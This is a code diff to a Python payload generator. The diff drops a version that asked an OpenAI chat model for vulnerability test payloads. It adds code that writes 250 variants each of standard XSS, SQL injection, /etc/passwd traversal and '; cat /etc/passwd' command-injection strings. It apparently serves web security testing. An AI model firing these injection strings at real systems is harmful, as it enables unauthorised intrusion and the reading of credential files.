@@ -1,25 +1,31 @@
-import openai
-import os
+# generate_payloads.py
 
-api_key = os.getenv("OPENAI_API_KEY")
-if not api_key:
-    api_key = input("Enter your OpenAI API key securely: ")
+def generate_xss_payloads():
+    return [f"<script>alert('XSS {i}')</script>" for i in range(1, 251)]
 
-openai.api_key = api_key
+def generate_sqli_payloads():
+    return [f"' OR {i}={i} --" for i in range(1, 251)]
 
-with open("site_content.txt", "r") as f:
-    content = f.read()
+def generate_lfi_payloads():
+    return [f"../../{'../'*i}etc/passwd" for i in range(1, 251)]
 
-prompt = f"Suggest 3 simple test payloads for vulnerabilities (XSS, SQL Injection, Directory Traversal) based on this text: {content[:2000]}"
+def generate_rce_payloads():
+    return [f"; cat /etc/passwd #{i}" for i in range(1, 251)]
 
-response = openai.ChatCompletion.create(
-  model="gpt-3.5-turbo",
-  messages=[{"role": "user", "content": prompt}]
-)
+def generate_all_payloads():
+    xss = generate_xss_payloads()
+    sqli = generate_sqli_payloads()
+    lfi = generate_lfi_payloads()
+    rce = generate_rce_payloads()
+    all_payloads = xss + sqli + lfi + rce
+    return all_payloads
 
-payloads = response.choices[0].message.content
+def save_payloads(payloads):
+    with open("payloads.txt", "w") as f:
+        for payload in payloads:
+            f.write(payload + "\n")
+    print("Payloads generated and saved.")
 
-with open("payloads.txt", "w") as f:
-    f.write(payloads)
-
-print("Payloads generated and saved.")
+if __name__ == "__main__":
+    payloads = generate_all_payloads()
+    save_payloads(payloads)
